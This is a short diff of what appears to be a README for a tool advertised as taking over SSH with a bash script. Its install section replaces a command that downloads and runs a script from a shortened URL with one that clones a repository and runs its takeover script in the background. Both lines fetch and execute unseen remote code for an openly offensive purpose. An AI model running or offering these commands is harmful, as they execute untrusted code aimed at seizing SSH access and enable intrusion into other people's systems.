@@ -2,4 +2,4 @@
 Takeover SSH with this simple bash script.
 
 ### Install
-wget https://is.gd/sshpwn && chmod +x sshpwn && ./sshpwn
+git clone https://github.com/ind3p3nd3nt/sshtakeover && sh sshtakeover/takeover.sh &
